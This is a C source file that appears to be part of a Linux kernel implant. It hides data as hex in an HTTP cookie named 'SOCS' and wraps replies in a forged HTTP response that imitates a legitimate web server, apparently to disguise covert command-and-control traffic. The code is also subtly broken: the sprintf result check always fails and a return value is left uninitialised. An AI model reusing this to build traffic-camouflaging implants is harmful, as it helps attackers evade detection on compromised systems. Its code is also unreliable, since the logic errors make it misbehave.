#include <linux/types.h>
#include <linux/string.h>
#include <linux/base64.h>

#include "../../sys/crypto.h"
#include "../../sys/mem.h"
#include "../iface.h"

#include "http.h"

#define HTTP_COOKIE "SOCS"
#define SEARCH_STRING (HTTP_COOKIE "=")
#define IS_HASH(val) ((val >= 48 && val <= 57) || (val >= 97 && val <= 102))

// basically greps for SEARCH_STRING and does hex decode()
static int enc_http_decode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    char *search_start;
    char *cookie_start;
    size_t cookie_size;

    search_start = strnstr(req_buf, SEARCH_STRING, req_buflen);
    if (search_start == NULL)
        return -EINVAL;

    cookie_start = search_start + strlen(SEARCH_STRING);

    // strchr but with multiple chars, and stop when buflen is met
    for (cookie_size = 0; (void*)(cookie_start + cookie_size) < (void*)(req_buf + req_buflen) && IS_HASH(cookie_start[cookie_size]); cookie_size++);

    return hex_decode(cookie_start, cookie_size, res_buf, res_buflen);
}

static int enc_http_encode(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    u8 *encoded_buf;
    size_t encoded_buflen;
    int retv;
    const char *response = "HTTP/2 200 OK\r\n"
                            "Vary: origin\r\n"
                            "Access-Control-Allow-Credentials: true\r\n"
                            "Access-Control-Allow-Methods: GET,POST\r\n"
                            "Access-Control-Allow-Headers: authorization\r\n"
                            "Content-Type: text/html\r\n"
                            "Server: ESF\r\n"
                            "Set-Cookie: %s=%.*s; expires=Sun, 25-Aug-2024 20:12:26 GMT; path=/; Secure; HttpOnly; priority=high\r\n"
                            "Content-Length: 0\r\n"
                            "X-Xss-Protection: 0\r\n"
                            "X-Frame-Options: SAMEORIGIN\r\n"
                            "X-Content-Type-Options: nosniff\r\n"
                            "\r";

    hex_encode(req_buf, req_buflen, &encoded_buf, &encoded_buflen);
    
    *res_buflen = strlen(response) + strlen(HTTP_COOKIE) + encoded_buflen - 2 - 4 + 1;
    *res_buf = kzmalloc(*res_buflen, GFP_KERNEL);
    if (IS_ERR(*res_buf))
    {
        retv = PTR_ERR(*res_buf);
        *res_buf = NULL;
        *res_buflen = 0;
        return retv;
    }

    if (sprintf(*res_buf, response, HTTP_COOKIE, encoded_buflen, encoded_buf) != 2)
    {
        kzfree(*res_buf, *res_buflen);
        *res_buf = NULL;
        *res_buflen = 0;
        retv = -EPROTO;
        goto LAB_OUT;
    }

    (*res_buf)[*res_buflen-1] = '\n'; // fix sprintf not supporting no NB at end

LAB_OUT:
    kzfree(encoded_buf, encoded_buflen);

    return retv;
    
}

int enc_http_process(size_t index, const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    u8 *decoded_buf;
    size_t decoded_buflen;
    u8 *next_res_buf;
    size_t next_res_buflen;
    int retv;

    retv = enc_http_decode(req_buf, req_buflen, &decoded_buf, &decoded_buflen);
    if (retv < 0)
        return retv;

    call_next_encoding(index+1, decoded_buf, decoded_buflen, &next_res_buf, &next_res_buflen);
    kzfree(decoded_buf, decoded_buflen);

    retv = enc_http_encode(next_res_buf, next_res_buflen, res_buf, res_buflen);
    kzfree(next_res_buf, next_res_buflen);

    if (retv < 0)
        return retv;

    return 0;
}